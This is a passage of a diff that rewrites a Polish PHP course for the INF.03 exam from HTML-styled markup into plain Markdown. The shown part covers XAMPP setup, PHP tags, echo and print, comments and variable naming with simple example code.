@@ -1,3948 +1,6319 @@
-# **PHP - KOMPLETNY PRZEWODNIK**
+# **PHP - KOMPLEKSOWY KURS DLA UCZNIÓW INF.03**
+
+---
+
+## ⚠️ **UWAGA! WAŻNE DLA EGZAMINU INF.03**
+
+### **Kolejność nauki vs kolejność na egzaminie**
+
+Ten kurs jest ułożony **PEDAGOGICZNIE** - od podstaw do zaawansowanych zagadnień. To najlepsza kolejność dla **nauki**.
+
+**ALE UWAGA!** Na prawdziwym egzaminie INF.03 kolejność zadań jest **INNA**:
+
+| **Kolejność w NAUCE (ten kurs)** | **Kolejność na EGZAMINIE** |
+|----------------------------------|----------------------------|
+| 1. Podstawy PHP (zmienne, pętle, tablice) | 1. **BAZA DANYCH (SQL w phpMyAdmin)** |
+| 2. Funkcje | 2. **STRONA WWW (HTML + CSS + PHP)** |
+| 3. Formularze | 3. **GRAFIKA (GIMP)** |
+| 4. Bazy danych MySQL | 4. **SKRYPTY PHP łączące z bazą** |
+
+**Dlaczego taka różnica?**
+- 📚 **W nauce:** Musisz najpierw poznać podstawy PHP, żeby rozumieć jak działa kod
+- 🎯 **Na egzaminie:** Najpierw wykonujesz zadania SQL (nie potrzebujesz PHP!), potem łączysz PHP z gotową bazą
+
+**Co to oznacza dla Ciebie?**
+✅ Ucz się zgodnie z tym kursem (od początku do końca)  
+✅ Przed egzaminem przejrzyj rozdział **"11b. PRZYKŁADOWE ZADANIE EGZAMINACYJNE"** - tam zobaczysz dokładnie jak wygląda egzamin  
+✅ Pamiętaj: na egzaminie zaczniesz od SQL w phpMyAdmin, nie od PHP!
+
+---
 
 ## **SPIS TREŚCI**
 
-<div style="display: flex; flex-wrap: wrap; gap: 20px;">
+### 📚 PODSTAWY
+1. [Wprowadzenie do PHP](#1-wprowadzenie-do-php)
+2. [Podstawy składni PHP](#2-podstawy-składni-php)
+3. [Zmienne i typy danych](#3-zmienne-i-typy-danych)
+4. [Operatory - wykonywanie działań na danych](#4-operatory---wykonywanie-działań-na-danych)
+5. [Instrukcje warunkowe - podejmowanie decyzji](#5-instrukcje-warunkowe---podejmowanie-decyzji)
 
-<div style="flex: 1; min-width: 250px; background-color: #E0F7FA; border-left: 5px solid #00BCD4; padding: 10px;">
-<h3 style="color: #00838F;">📚 PODSTAWY</h3>
-<ul style="color: #333333;">
-  <li><a href="#1-wprowadzenie-do-php" style="color: #00838F;">1. Wprowadzenie do PHP</a></li>
-  <li><a href="#2-podstawy-składni-php" style="color: #00838F;">2. Podstawy składni PHP</a></li>
-  <li><a href="#3-zmienne---przechowywanie-danych" style="color: #00838F;">3. Zmienne i typy danych</a></li>
-  <li><a href="#4-operatory---wykonywanie-działań-na-danych" style="color: #00838F;">4. Operatory</a></li>
-  <li><a href="#5-instrukcje-sterujące---kontrola-przepływu-programu" style="color: #00838F;">5. Instrukcje sterujące</a></li>
-</ul>
-</div>
+### 🔄 PĘTLE I TABLICE
+6. [Pętle - powtarzanie kodu](#6-pętle---powtarzanie-kodu)
+7. [Tablice - przechowywanie wielu danych](#7-tablice---przechowywanie-wielu-danych)
 
-<div style="flex: 1; min-width: 250px; background-color: #FFF8E1; border-left: 5px solid #FFB300; padding: 10px;">
-<h3 style="color: #FF8F00;">🛠️ NARZĘDZIA I TECHNIKI</h3>
-<ul style="color: #333333;">
-  <li><a href="#6-funkcje---organizacja-kodu" style="color: #FF8F00;">6. Funkcje</a></li>
-  <li><a href="#7-obsługa-formularzy---komunikacja-z-użytkownikiem" style="color: #FF8F00;">7. Obsługa formularzy</a></li>
-  <li><a href="#8-praca-z-bazą-danych---trwałe-przechowywanie-danych" style="color: #FF8F00;">8. Bazy danych</a></li>
-  <li><a href="#9-sesje-i-ciasteczka---zapamiętywanie-użytkownika" style="color: #FF8F00;">9. Sesje i ciasteczka</a></li>
-  <li><a href="#10-obsługa-plików---praca-z-systemem-plików" style="color: #FF8F00;">10. Obsługa plików</a></li>
-</ul>
-</div>
+### 🛠️ FUNKCJE I FORMULARZE
+8. [Funkcje - organizacja kodu](#8-funkcje---organizacja-kodu)
+9. [Formularze - komunikacja z użytkownikiem](#9-formularze---komunikacja-z-użytkownikiem)
 
-<div style="flex: 1; min-width: 250px; background-color: #F3E5F5; border-left: 5px solid #9C27B0; padding: 10px;">
-<h3 style="color: #6A1B9A;">🔐 BEZPIECZEŃSTWO I DOBRE PRAKTYKI</h3>
-<ul style="color: #333333;">
-  <li><a href="#11-upload-plików---przyjmowanie-plików-od-użytkowników" style="color: #6A1B9A;">11. Upload plików</a></li>
-  <li><a href="#12-obsługa-błędów---debugowanie-i-zarządzanie-problemami" style="color: #6A1B9A;">12. Obsługa błędów</a></li>
-  <li><a href="#13-przydatne-funkcje---narzędzia-na-co-dzień" style="color: #6A1B9A;">13. Przydatne funkcje</a></li>
-  <li><a href="#14-podstawy-bezpieczeństwa---ochrona-aplikacji" style="color: #6A1B9A;">14. Bezpieczeństwo</a></li>
-  <li><a href="#podsumowanie---twoja-droga-z-php" style="color: #6A1B9A;">15. Podsumowanie</a></li>
-</ul>
-</div>
+### 📁 PLIKI I BAZY DANYCH
+10. [Praca z plikami](#10-praca-z-plikami)
+11. [Bazy danych MySQL - STYL PROCEDURALNY (EGZAMIN INF.03)](#11-bazy-danych-mysql)
+    - 11a. Podstawy SQL i mysqli
+    - 11b. [PRZYKŁADOWE ZADANIE EGZAMINACYJNE](#11b-przykładowe-zadanie-egzaminacyjne-inf03-jak-wygląda-prawdziwy-egzamin)
 
-</div>
+### 🔐 SESJE I BEZPIECZEŃSTWO
+12. [Sesje i ciasteczka](#12-sesje-i-ciasteczka)
+13. [Upload plików](#13-upload-plików)
+14. [Bezpieczeństwo aplikacji](#14-bezpieczeństwo-aplikacji)
+15. [Najczęstsze błędy i rozwiązywanie problemów](#15-najczęstsze-błędy-i-rozwiązywanie-problemów)
+
+### 📝 MATERIAŁY EGZAMINACYJNE
+- [Typowe zadania egzaminacyjne - rozwiązane](#typowe-zadania-egzaminacyjne---rozwiązane-krok-po-kroku)
+- [Ściągawka przed egzaminem](#ściągawka---szybkie-powtórki-przed-egzaminem-inf03)
+- [Przydatne linki i zasoby](#przydatne-linki-i-zasoby)
 
 ---
 
 ## **1. Wprowadzenie do PHP**
 
-<img src="https://www.php.net/images/logos/new-php-logo.svg" width="120" align="right" alt="Logo PHP">
+### **Czym jest PHP?**
 
-### Czym jest PHP?
+PHP (PHP: Hypertext Preprocessor) to język skryptowy po stronie serwera, stworzony specjalnie do tworzenia dynamicznych stron internetowych. W przeciwieństwie do języków takich jak HTML czy CSS, które działają w przeglądarce użytkownika, **PHP wykonuje się na serwerze** webowym przed wysłaniem strony do przeglądarki.
 
-PHP (PHP: Hypertext Preprocessor) to język skryptowy po stronie serwera, zaprojektowany specjalnie do tworzenia dynamicznych stron internetowych. W przeciwieństwie do języków takich jak HTML czy CSS, które działają w przeglądarce użytkownika, PHP wykonuje się na serwerze webowym przed wysłaniem strony do przeglądarki.
+#### **Dlaczego PHP jest popularny?**
 
-### Dlaczego PHP?
+| Zaleta | Opis |
+|--------|------|
+| ✅ **Łatwość nauki** | Składnia podobna do C, łatwa dla początkujących |
+| ✅ **Darmowy** | Całkowicie bezpłatny i open-source |
+| ✅ **Wszechstronny** | Od prostych stron po złożone aplikacje |
+| ✅ **Duża społeczność** | Mnóstwo pomocy, tutoriali i gotowych rozwiązań |
+| ✅ **Wsparcie baz danych** | Łatwa integracja z MySQL, PostgreSQL i innymi |
+| ✅ **Hosting** | Dostępny na niemal każdym serwerze WWW |
 
-<table>
-  <tr>
-    <td width="50px" align="center">✨</td>
-    <td><b>Łatwość nauki:</b> Składnia podobna do C i innych popularnych języków</td>
-  </tr>
-  <tr>
-    <td align="center">🆓</td>
-    <td><b>Darmowy i otwarty:</b> Całkowicie bezpłatny do użytku komercyjnego</td>
-  </tr>
-  <tr>
-    <td align="center">🔄</td>
-    <td><b>Wszechstronność:</b> Od prostych stron po złożone aplikacje</td>
-  </tr>
-  <tr>
-    <td align="center">👥</td>
-    <td><b>Ogromna społeczność:</b> Mnóstwo dokumentacji i pomocy online</td>
-  </tr>
-  <tr>
-    <td align="center">⚡</td>
-    <td><b>Szybkość rozwoju:</b> Szybkie prototypowanie i implementacja</td>
-  </tr>
-</table>
+### **Jak działa PHP? - Proces krok po kroku**
 
-### Jak działa PHP?
-
-<div style="background-color: #E0F7FA; border-left: 5px solid #00BCD4; padding: 10px;">
-<h4 style="margin-top: 0;">Proces działania PHP:</h4>
-<ol style="color: #333333;">
-<li><b>Przeglądarka</b> wysyła żądanie do serwera (np. otwiera stronę.php)</li>
-<li><b>Serwer</b> wykonuje kod PHP i generuje HTML</li>
-<li><b>HTML</b> jest wysyłany do przeglądarki użytkownika</li>
-<li><b>Przeglądarka</b> wyświetla gotową stronę</li>
-</ol>
-</div>
-<div align="center">
-
-```mermaid
-graph TB
-    subgraph "🌐 Klient"
-        A[👤 Użytkownik]
-        B[🖥️ Przeglądarka]
-    end
-
-    subgraph "🖧 Serwer Web"
-        C[📡 Apache/Nginx]
-        D[🐘 Interpreter PHP]
-        E[💾 Pliki PHP]
-    end
-
-    subgraph "🗄️ Dane"
-        F[📊 MySQL/MariaDB]
-        G[📁 System Plików]
-    end
-
-    A -->|1. Otwiera stronę| B
-    B -->|2. Żąda strony.php| C
-    C -->|3. Przekazuje żądanie| D
-    D -->|4. Wczytuje| E
-    D <-->|5. Pobiera/zapisuje dane| F
-    D <-->|6. Operacje na plikach| G
-    D -->|7. Generuje HTML| C
-    C -->|8. Zwraca HTML| B
-    B -->|9. Wyświetla stronę| A
-
-    style A fill:#f9f9f9,stroke:#333,stroke-width:1px
-    style B fill:#f0f0f0,stroke:#333,stroke-width:1px
-    style C fill:#e0f7fa,stroke:#00bcd4,stroke-width:1px
-    style D fill:#e8eaf6,stroke:#3f51b5,stroke-width:1px
-    style E fill:#fff3e0,stroke:#ff9800,stroke-width:1px
-    style F fill:#f3e5f5,stroke:#9c27b0,stroke-width:1px
-    style G fill:#e8f5e9,stroke:#4caf50,stroke-width:1px
+```
+┌─────────────┐
+│  Użytkownik │ 1. Wpisuje adres: localhost/strona.php
+└──────┬──────┘
+       │
+       v
+┌─────────────┐
+│ Przeglądarka│ 2. Wysyła żądanie do serwera
+└──────┬──────┘
+       │
+       v
+┌─────────────┐
+│   Serwer    │ 3. Serwer (Apache/Nginx) otrzymuje żądanie
+│   Apache    │ 4. Przekazuje plik .php do interpretera PHP
+└──────┬──────┘
+       │
+       v
+┌─────────────┐
+│     PHP     │ 5. PHP wykonuje kod
+│ Interpreter │ 6. PHP łączy się z bazą danych (jeśli potrzeba)
+└──────┬──────┘ 7. PHP generuje czysty HTML
+       │
+       v
+┌─────────────┐
+│   Serwer    │ 8. Zwraca gotowy HTML do przeglądarki
+└──────┬──────┘
+       │
+       v
+┌─────────────┐
+│ Przeglądarka│ 9. Wyświetla stronę użytkownikowi
+└─────────────┘
 ```
 
-</div>
+**WAŻNE:** Użytkownik nigdy nie widzi kodu PHP! Tylko gotowy HTML.
 
-### Konfiguracja środowiska:
+### **Instalacja środowiska - XAMPP**
 
-<table>
-  <tr>
-    <td width="50px" align="center">1️⃣</td>
-    <td>Zainstaluj <b>XAMPP</b> (Apache + PHP + MySQL)</td>
-  </tr>
-  <tr>
-    <td align="center">2️⃣</td>
-    <td>Pliki PHP zapisuj w katalogu <code>htdocs</code></td>
-  </tr>
-  <tr>
-    <td align="center">3️⃣</td>
-    <td>Uruchom Apache w panelu XAMPP</td>
-  </tr>
-  <tr>
-    <td align="center">4️⃣</td>
-    <td>Otwórz <code>localhost/twoj_plik.php</code> w przeglądarce</td>
-  </tr>
-</table>
+Do nauki PHP potrzebujesz lokalnego serwera. Najpopularniejszym rozwiązaniem jest **XAMPP**, który zawiera:
+- **Apache** - serwer WWW
+- **PHP** - interpreter PHP
+- **MySQL** - baza danych
+- **phpMyAdmin** - narzędzie do zarządzania bazą danych
 
-<div style="background-color: #FFF3CD; border-left: 5px solid #FFC107; padding: 10px;">
-<h4 style="margin-top: 0;">⚠️ WAŻNE!</h4>
-<p style="color: #333333;">Upewnij się, że Twoje pliki mają rozszerzenie <code>.php</code>, a nie <code>.html</code> - inaczej kod PHP nie zostanie przetworzony!</p>
-</div>
+#### **Instrukcja instalacji krok po kroku:**
+
+**Krok 1: Pobieranie**
+1. Wejdź na stronę: https://www.apachefriends.org/
+2. Pobierz wersję dla swojego systemu (Windows/Mac/Linux)
+3. Uruchom instalator
+
+**Krok 2: Instalacja**
+1. Wybierz komponenty (zaznacz wszystko)
+2. Wybierz folder instalacji (domyślnie: `C:\xampp`)
+3. Zainstaluj program
+
+**Krok 3: Uruchomienie**
+1. Otwórz **XAMPP Control Panel**
+2. Kliknij **"Start"** przy **Apache**
+3. Kliknij **"Start"** przy **MySQL**
+4. Jeśli przyciski zmienią kolor na zielony - działa!
+
+**Krok 4: Test instalacji**
+1. Otwórz przeglądarkę
+2. Wpisz: `localhost` lub `127.0.0.1`
+3. Powinieneś zobaczyć stronę powitalną XAMPP
+
+#### **Gdzie zapisywać pliki PHP?**
+
+Wszystkie pliki PHP musisz zapisać w folderze **`htdocs`**:
+
+```
+Windows: C:\xampp\htdocs\
+Mac/Linux: /opt/lampp/htdocs/
+```
+
+**Przykład:**
+- Plik: `C:\xampp\htdocs\test.php`
+- Adres w przeglądarce: `localhost/test.php`
+
+#### **Twój pierwszy plik PHP**
+
+Stwórz plik `test.php` w folderze `htdocs`:
+
+```php
+<?php
+    echo "Witaj w PHP!";
+    echo "<h1>PHP działa poprawnie!</h1>";
+    echo "Aktualna data: " . date("Y-m-d H:i:s");
+?>
+```
+
+Otwórz w przeglądarce: `localhost/test.php`
+
+**Jeśli widzisz tekst - gratulacje! PHP działa!**
+
+### **Różnice między PHP a HTML**
+
+| Cecha | HTML | PHP |
+|-------|------|-----|
+| **Gdzie się wykonuje?** | W przeglądarce (klient) | Na serwerze |
+| **Co robi?** | Struktura strony | Generuje HTML, łączy z bazą |
+| **Czy widać kod źródłowy?** | TAK (Ctrl+U) | NIE (tylko wynik) |
+| **Czy może łączyć się z bazą?** | NIE | TAK |
+| **Rozszerzenie pliku** | `.html` | `.php` |
+| **Czy może zawierać HTML?** | - | TAK |
+
+**Przykład - różnica w działaniu:**
+
+**HTML** (`strona.html`):
+```html
+<h1>Witaj!</h1>
+<p>Jest godzina: [tutaj nie możesz wstawić aktualnej godziny]</p>
+```
+
+**PHP** (`strona.php`):
+```php
+<h1>Witaj!</h1>
+<p>Jest godzina: <?php echo date("H:i:s"); ?></p>
+```
 
 ---
 
 ## **2. Podstawy składni PHP**
 
-### Znaczniki PHP - Jak PHP wie, gdzie zaczyna się kod?
+### **Znaczniki PHP - jak PHP wie gdzie jest kod?**
 
-<div style="background-color: #EDE7F6; border-left: 5px solid #673AB7; padding: 10px;">
-<p style="color: #333333;">PHP musi być wyraźnie oddzielony od HTML. Do tego służą specjalne znaczniki, które informują serwer gdzie zaczyna się i kończy kod PHP.</p>
-</div>
+PHP musi być wyraźnie oznaczony w pliku. Używamy do tego **znaczników**.
+
+#### **Podstawowy znacznik (ZAWSZE używaj tego!)**
 
 ```php
 <?php
+    // Tutaj piszesz kod PHP
     echo "Hello World!";
 ?>
 ```
 
-<table>
-  <tr>
-    <th>Element składni</th>
-    <th>Wyjaśnienie</th>
-  </tr>
-  <tr>
-    <td><code>&lt;?php</code></td>
-    <td>Rozpoczyna blok kodu PHP</td>
-  </tr>
-  <tr>
-    <td><code>echo</code></td>
-    <td>Polecenie wyświetlające tekst</td>
-  </tr>
-  <tr>
-    <td><code>;</code></td>
-    <td>Średnik kończący instrukcję</td>
-  </tr>
-  <tr>
-    <td><code>?&gt;</code></td>
-    <td>Kończy blok kodu PHP (opcjonalny na końcu pliku)</td>
-  </tr>
-</table>
+- `<?php` - rozpoczyna blok kodu PHP
+- `?>` - kończy blok kodu PHP (opcjonalne na końcu pliku)
 
-### Osadzanie PHP w HTML - Dynamiczne strony
-
-<div style="background-color: #E8F5E9; border-left: 5px solid #4CAF50; padding: 10px;">
-<p style="color: #333333;">Największą siłą PHP jest możliwość mieszania kodu z HTML, co pozwala tworzyć dynamiczne treści w statycznych szablonach.</p>
-</div>
+#### **Przykład z HTML**
 
 ```php
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PHP w HTML</title>
+    <title>Moja strona</title>
 </head>
 <body>
-    <h1><?php echo "Dynamiczny tytuł"; ?></h1>
-    <p>Dzisiaj jest: <?php echo date("Y-m-d"); ?></p>
+    <h1>Witaj na stronie!</h1>
+    
+    <?php
+        echo "<p>To jest tekst wygenerowany przez PHP</p>";
+        echo "<p>Dzisiaj jest: " . date("Y-m-d") . "</p>";
+    ?>
+    
+    <footer>Stopka strony</footer>
 </body>
 </html>
 ```
 
-<div style="background-color: #E3F2FD; border-left: 5px solid #2196F3; padding: 10px;">
-<h4 style="margin-top: 0;">🔍 Dlaczego to potężne?</h4>
-<ul style="color: #333333;">
-<li>Treść może się zmieniać w zależności od danych</li>
-<li>Jedna strona może wyświetlać różne informacje</li>
-<li>Personalizacja strony dla każdego użytkownika</li>
-</ul>
-</div>
+### **Wyświetlanie tekstu - echo i print**
 
-### Komentarze - Dokumentowanie kodu
+W PHP mamy dwa główne sposoby na wyświetlanie tekstu:
 
-<div style="background-color: #FEFAF0; border-left: 5px solid #8D6E63; padding: 10px;">
-<p style="color: #333333;">Komentarze to tekst ignorowany przez PHP, służący do wyjaśniania kodu. To jak notatki na marginesie, które pomagają zrozumieć kod.</p>
-</div>
+#### **1. echo (najczęściej używany)**
 
 ```php
 <?php
-// Komentarz jednolinijkowy - wyjaśnia jedną linię
-# Także jednolinijkowy (styl Unix)
-
-/*
-   Komentarz wielolinijkowy
-   Służy do dłuższych wyjaśnień
-   lub tymczasowego wyłączania kodu
-*/
-
-echo "Ten kod się wykona"; // Komentarz na końcu linii
+    echo "Prosty tekst";
+    echo "Linia 1";
+    echo "Linia 2";
+    
+    // Można wyświetlać wiele rzeczy naraz
+    echo "Tekst ", "kolejny tekst ", "i jeszcze jeden";
+    
+    // echo bez nawiasów (krócej)
+    echo "Hello";
 ?>
 ```
+
+#### **2. print (alternatywa)**
+
+```php
+<?php
+    print "Hello World";
+    print("Hello World");  // Z nawiasami też działa
+?>
+```
+
+**Różnica między echo i print:**
+
+| Cecha | echo | print |
+|-------|------|-------|
+| Szybkość | Trochę szybszy | Trochę wolniejszy |
+| Zwraca wartość | NIE | TAK (zawsze 1) |
+| Wiele argumentów | TAK | NIE |
+| Popularność | Bardziej popularny | Mniej popularny |
+
+**Najlepsza praktyka:** Używaj `echo` - jest szybszy i bardziej popularny.
+
+### **Średnik - BARDZO WAŻNE!**
+
+**Każda instrukcja w PHP MUSI kończyć się średnikiem `;`**
+
+```php
+<?php
+    echo "Linia 1";  // Średnik!
+    echo "Linia 2";  // Średnik!
+    
+    $zmienna = 10;   // Średnik!
+?>
+```
+
+**BEZ średnika - BŁĄD:**
+```php
+<?php
+    echo "Linia 1"   // ❌ BŁĄD! Brak średnika
+    echo "Linia 2"   // ❌ BŁĄD! Brak średnika
+?>
+```
+
+### **Komentarze - notatki w kodzie**
+
+Komentarze to tekst, który PHP **ignoruje**. Służą do wyjaśniania kodu.
+
+#### **Komentarz jednolinijkowy**
+
+```php
+<?php
+    // To jest komentarz - PHP to pominie
+    echo "Ten kod się wykona";
+    
+    # To też jest komentarz (styl Unix)
+    
+    echo "Hello"; // Komentarz może być na końcu linii
+?>
+```
+
+#### **Komentarz wielolinijkowy**
+
+```php
+<?php
+    /*
+       To jest dłuższy komentarz
+       który zajmuje wiele linii.
+       Przydatne do opisywania
+       skomplikowanych fragmentów kodu.
+    */
+    echo "Ten kod się wykona";
+?>
+```
+
+#### **Kiedy używać komentarzy?**
+
+✅ **Używaj gdy:**
+- Wyjaśniasz skomplikowany fragment kodu
+- Opisujesz funkcję i jej parametry
+- Zostawiasz notatki dla siebie na przyszłość
+- Chcesz tymczasowo wyłączyć kod (zamiast usuwać)
+
+❌ **NIE używaj gdy:**
+- Kod jest oczywisty (np. `$suma = $a + $b; // dodawanie` - zbędne)
+- Komentarz tylko powtarza to co robi kod
+
+**Przykłady dobrych komentarzy:**
+
+```php
+<?php
+    // Obliczenie rabatu 20% dla stałych klientów
+    $cenaPoRabacie = $cena * 0.8;
+    
+    // TODO: Dodać walidację email przed zapisem
+    
+    // UWAGA: Ta funkcja wymaga PHP 7.4+
+    
+    /*
+       Funkcja obliczająca cenę brutto
+       Parametry:
+       - $netto: cena netto (float)
+       - $vat: stawka VAT w procentach (int, domyślnie 23)
+       Zwraca: cenę brutto (float)
+    */
+?>
+```
+
+### **Wielkość liter w PHP**
+
+#### **PHP jest CZĘŚCIOWO wrażliwe na wielkość liter:**
+
+```php
+<?php
+    // Funkcje i konstrukcje językowe - wielkość liter NIE ma znaczenia
+    ECHO "test";   // ✅ Działa
+    Echo "test";   // ✅ Działa
+    echo "test";   // ✅ Działa
+    
+    IF (true) { }  // ✅ Działa
+    if (true) { }  // ✅ Działa
+    
+    // Zmienne - wielkość liter MA znaczenie!
+    $imie = "Jan";
+    $Imie = "Anna";
+    $IMIE = "Piotr";
+    // To są TRZY RÓŻNE zmienne!
+    
+    echo $imie;  // Jan
+    echo $Imie;  // Anna
+    echo $IMIE;  // Piotr
+?>
+```
+
+**Najlepsza praktyka:**
+- Funkcje i słowa kluczowe pisz małymi literami: `echo`, `if`, `while`
+- Nazwy zmiennych: camelCase (`$mojaNazwa`) lub snake_case (`$moja_nazwa`)
 
 ---
 
-## **3. Zmienne - Przechowywanie danych**
+## **3. Zmienne i typy danych**
 
-### Czym są zmienne?
+### **Co to jest zmienna?**
 
-</div>
+Zmienna to **pojemnik na dane** z nadaną nazwą. Możesz w niej przechowywać różne wartości i je zmieniać.
 
-<div style="background-color: #F3E5F5; border-left: 5px solid #9C27B0; padding: 10px;">
-<p style="color: #333333;">Zmienna to "pojemnik" na dane, który ma nazwę i może przechowywać różne wartości. To jak opisane pudełko, w którym możesz przechowywać różne rzeczy.</p>
-</div>
+**Analogia:** Zmienna jest jak pudełko z etykietą:
+- **Etykieta** = nazwa zmiennej (np. `$wiek`)
+- **Zawartość pudełka** = wartość (np. `25`)
+- Możesz zmieniać zawartość pudełka w dowolnym momencie
 
-### Dlaczego używamy zmiennych?
-
-<table>
-  <tr>
-    <td width="50px" align="center">📦</td>
-    <td><b>Przechowywanie danych:</b> Nazwa użytkownika, wiek, cena produktu</td>
-  </tr>
-  <tr>
-    <td align="center">🔄</td>
-    <td><b>Wielokrotne wykorzystanie:</b> Jedna wartość w wielu miejscach</td>
-  </tr>
-  <tr>
-    <td align="center">📈</td>
-    <td><b>Dynamiczność:</b> Wartości mogą się zmieniać podczas działania programu</td>
-  </tr>
-</table>
+### **Tworzenie zmiennych - składnia**
 
 ```php
 <?php
-$imie = "Jan";          // String (tekst)
-$wiek = 25;             // Integer (liczba całkowita)
-$wzrost = 175.5;        // Float (liczba dziesiętna)
-$czyAktywny = true;     // Boolean (prawda/fałsz)
-$pusty = null;          // NULL (brak wartości)
-
-echo "Witaj $imie, masz $wiek lat";
+    $nazwaZmiennej = wartość;
 ?>
 ```
 
-### Nazewnictwo zmiennych - Ważne zasady
+**WAŻNE zasady:**
+1. ✅ Zmienna ZAWSZE zaczyna się od `$`
+2. ✅ Po `$` musi być litera lub `_`
+3. ✅ Może zawierać litery, cyfry, `_`
+4. ✅ Wielkość liter MA ZNACZENIE
+5. ❌ NIE może zaczynać się od cyfry
+6. ❌ NIE może zawierać spacji
 
-<div style="background-color: #FFEBEE; border-left: 5px solid #F44336; padding: 10px;">
-<h4 style="margin-top: 0; style="color: #333333;"">⚠️ Zasady nazewnictwa</h4>
-<ul style="color: #333333;">
-<li>Zawsze zaczynaj od znaku <code>$</code></li>
-<li>Po <code>$</code> musi być litera lub znak podkreślenia (<code>_</code>)</li>
-<li>Może zawierać litery, cyfry, <code>_</code></li>
-<li>Wielkość liter ma znaczenie: <code>$imie</code> ≠ <code>$Imie</code></li>
-<li>Używaj opisowych nazw: <code>$wiekUzytkownika</code> zamiast <code>$w</code></li>
-</ul>
-</div>
-
-<div style="background-color: #E8EAF6; border-left: 5px solid #3F51B5; padding: 10px;">
-<p style="color: #333333;">Stałe to wartości, które po zdefiniowaniu nie mogą się zmienić. Są jak wyryte w kamieniu napisy - raz zapisane, nie mogą być zmienione.</p>
-</div>
-
-<div style="background-color: #FBE9E7; border-left: 5px solid #FF5722; padding: 10px;">
-<p style="color: #333333;">Tablica to zmienna, która może przechowywać wiele wartości jednocześnie. Wyobraź sobie szufladę z przegródkami - każda przegródka może zawierać inną rzecz.</p>
-</div>
-<p>
+#### **Przykłady poprawnych nazw:**
 
 ```php
 <?php
-// Tablica indeksowana (numerowana od 0)
-$owoce = array("jabłko", "banan", "gruszka");
-$owoce = ["jabłko", "banan", "gruszka"]; // Nowsza składnia
-
-// Tablica asocjacyjna (klucz => wartość)
-$osoba = array(
-    "imie" => "Anna",
-    "wiek" => 30,
-    "miasto" => "Warszawa"
-);
-
-// Wyświetlanie
-echo $owoce[0];           // jabłko (pierwszy element)
-echo $osoba["imie"];      // Anna
-
-// Dodawanie elementów
-$owoce[] = "pomarańcza";               // Dodaje na koniec
-$osoba["email"] = "anna@email.com";    // Dodaje nowy klucz
+    $imie = "Jan";             // ✅
+    $wiek = 25;                // ✅
+    $cenaProduktu = 19.99;     // ✅
+    $cena_produktu = 19.99;    // ✅
+    $_test = "test";           // ✅
+    $test2 = "test";           // ✅
 ?>
 ```
 
-<!-- Wizualizacja podstawowych tablic -->
-<div style="display: flex; flex-wrap: wrap; gap: 20px; margin: 20px 0;">
-    <!-- Przykład tablicy indeksowanej -->
-    <div style="flex: 1; min-width: 300px; border-radius: 8px; overflow: hidden;">
-        <div style="background-color: #4CAF50; color: white; padding: 8px; text-align: center; font-weight: bold;">
-            Tablica indeksowana $owoce
-        </div>
-        <table style="width: 100%; border-collapse: collapse; background-color: white;">
-            <tr style="background-color: #E8F5E9;">
-                <th style="padding: 8px; border-right: 1px solid #C8E6C9; color: #1B5E20; font-weight: bold;">Indeks</th>
-                <th style="padding: 8px; color: #1B5E20; font-weight: bold;">Wartość</th>
-            </tr>
-            <tr>
-                <td style="padding: 8px; border-right: 1px solid #C8E6C9; text-align: center; color: #2E7D32; background-color: #F1F8E9;">0</td>
-                <td style="padding: 8px; color:rgb(136, 109, 13)">jabłko</td>
-            </tr>
-            <tr>
-                <td style="padding: 8px; border-right: 1px solid #C8E6C9; text-align: center; color: #2E7D32; background-color: #F1F8E9;">1</td>
-                <td style="padding: 8px; color:rgb(136, 109, 13)">banan</td>
-            </tr>
-            <tr>
-                <td style="padding: 8px; border-right: 1px solid #C8E6C9; text-align: center; color: #2E7D32; background-color: #F1F8E9;">2</td>
-                <td style="padding: 8px; color:rgb(136, 109, 13)" >gruszka</td>
-            </tr>
-        </table>
-    </div>
-
-<div style="flex: 1; min-width: 300px; border-radius: 8px; overflow: hidden;">
-        <div style="background-color: #FF9800; color: white; padding: 8px; text-align: center; font-weight: bold;">
-            Tablica asocjacyjna $osoba
-        </div>
-        <table style="width: 100%; border-collapse: collapse; background-color: white;">
-            <tr style="background-color: #FFF3E0;">
-                <th style="padding: 8px; border-right: 1px solid #FFECB3; color: #E65100; font-weight: bold;">Klucz</th>
-                <th style="padding: 8px; color: #E65100; font-weight: bold;">Wartość</th>
-            </tr>
-            <tr>
-                <td style="padding: 8px; border-right: 1px solid #FFECB3; text-align: center; color: #FF6D00; background-color: #FFF8E1;">imie</td>
-                <td style="padding: 8px; color:rgb(149, 25, 25)" >Anna</td>
-            </tr>
-            <tr>
-                <td style="padding: 8px; border-right: 1px solid #FFECB3; text-align: center; color: #FF6D00; background-color: #FFF8E1;">wiek</td>
-                <td style="padding: 8px; color:rgb(149, 25, 25)">30</td>
-            </tr>
-            <tr>
-                <td style="padding: 8px; border-right: 1px solid #FFECB3; text-align: center; color: #FF6D00; background-color: #FFF8E1;">miasto</td>
-                <td style="padding: 8px; color:rgb(149, 25, 25)">Warszawa</td>
-            </tr>
-        </table>
-    </div>
-
-</div>
-
-<div style="background-color: #E3F2FD; border-left: 5px solid #2196F3; padding: 10px; margin-top: 20px;">
-<h4 style="margin-top: 0;">💡 Wskazówki dotyczące pracy z tablicami</h4>
-<ul style="color: #333333;">
-  <li>Używaj <code>foreach</code> do iteracji po tablicach - jest prostsze i czytelniejsze</li>
-  <li>Sprawdzaj istnienie kluczy w tablicach asocjacyjnych za pomocą <code>isset()</code> lub <code>array_key_exists()</code></li>
-  <li>Używaj funkcji <code>array_values()</code>, aby przenieść indeksy po usunięciu elementów</li>
-  <li>Dokumentuj złożone struktury tablic, aby ułatwić sobie i innym zrozumienie kodu</li>
-  <li>Regularnie przeglądaj i refaktoryzuj kod, aby unikać nadmiarowości i poprawić wydajność</li>
-</ul>
-</div>
-
----
-
-## **4. Operatory - Wykonywanie działań na danych**
-
-### Operatory arytmetyczne - Matematyka w PHP
-
-<div style="background-color: #E1F5FE; border-left: 5px solid #03A9F4; padding: 10px;">
-<p style="color: #333333;">Operatory arytmetyczne pozwalają wykonywać działania matematyczne na liczbach, tak samo jak w matematyce szkolnej.</p>
-</div>
-
-<table>
-  <tr>
-    <th>Operator</th>
-    <th>Nazwa</th>
-    <th>Przykład</th>
-    <th>Wynik</th>
-  </tr>
-  <tr>
-    <td><code>+</code></td>
-    <td>Dodawanie</td>
-    <td><code>$a = 10 + 5;</code></td>
-    <td>15</td>
-  </tr>
-  <tr>
-    <td><code>-</code></td>
-    <td>Odejmowanie</td>
-    <td><code>$b = 10 - 5;</code></td>
-    <td>5</td>
-  </tr>
-  <tr>
